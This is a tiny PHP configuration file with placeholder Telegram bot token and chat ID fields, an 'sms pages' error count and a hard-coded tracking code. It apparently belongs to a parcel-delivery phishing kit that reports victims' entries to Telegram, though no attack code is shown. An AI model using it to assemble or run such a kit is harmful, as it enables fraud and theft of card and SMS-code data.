<?php 
$TELEGRAM_API['bot_token'] = "your token";
$TELEGRAM_API['chat_id'] = "chatid";

// sms pages
$sms_error = 2;


//track code
$track = "DP7SSKJ3H98JS3XXX";

?>